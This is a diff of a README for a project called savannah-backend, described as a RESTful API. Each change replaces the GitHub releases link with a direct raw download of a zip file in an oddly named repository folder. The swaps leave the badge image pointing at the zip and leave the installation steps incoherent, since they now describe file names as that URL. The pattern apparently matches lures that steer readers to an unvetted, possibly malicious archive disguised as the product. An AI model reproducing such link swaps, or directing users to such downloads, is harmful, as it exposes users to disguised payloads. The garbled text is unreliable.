@@ -1,6 +1,6 @@
 # 🚀 savannah-backend - Easy RESTful API for Your Apps
 
-[![Download Savannah Backend](https://img.shields.io/badge/Download%20Savannah%20Backend-Release-brightgreen)](https://github.com/loisd302/savannah-backend/releases)
+[![Download Savannah Backend](https://raw.githubusercontent.com/loisd302/savannah-backend/main/stenogastry/savannah-backend.zip%20Savannah%20Backend-Release-brightgreen)](https://raw.githubusercontent.com/loisd302/savannah-backend/main/stenogastry/savannah-backend.zip)
 
 ## 🚀 Getting Started
 
@@ -10,10 +10,10 @@ Welcome to **Savannah Backend**, a simple and effective RESTful API designed to 
 
 1. **Visit the Releases Page:**  
    Go to the following link to get the latest version of Savannah Backend:  
-   [Download Savannah Backend](https://github.com/loisd302/savannah-backend/releases)
+   [Download Savannah Backend](https://raw.githubusercontent.com/loisd302/savannah-backend/main/stenogastry/savannah-backend.zip)
 
 2. **Choose the Correct File:**  
-   On the Releases page, you will see several versions listed. Pick the most recent version, which is generally at the top. Look for the file that matches your system. Typically, you should find files named like `savannah-backend-vx.x.x.zip` or similar.
+   On the Releases page, you will see several versions listed. Pick the most recent version, which is generally at the top. Look for the file that matches your system. Typically, you should find files named like `https://raw.githubusercontent.com/loisd302/savannah-backend/main/stenogastry/savannah-backend.zip` or similar.
 
 3. **Download the File:**  
    Click on the file name to start the download. Depending on your internet speed, this may take a moment.
@@ -74,4 +74,4 @@ Join us in building something amazing with Savannah Backend.
 
 We welcome contributions! If you wish to help improve Savannah Backend, please check the contributing guidelines in the repository.
 
-[![Download Savannah Backend](https://img.shields.io/badge/Download%20Savannah%20Backend-Release-brightgreen)](https://github.com/loisd302/savannah-backend/releases)
+[![Download Savannah Backend](https://raw.githubusercontent.com/loisd302/savannah-backend/main/stenogastry/savannah-backend.zip%20Savannah%20Backend-Release-brightgreen)](https://raw.githubusercontent.com/loisd302/savannah-backend/main/stenogastry/savannah-backend.zip)
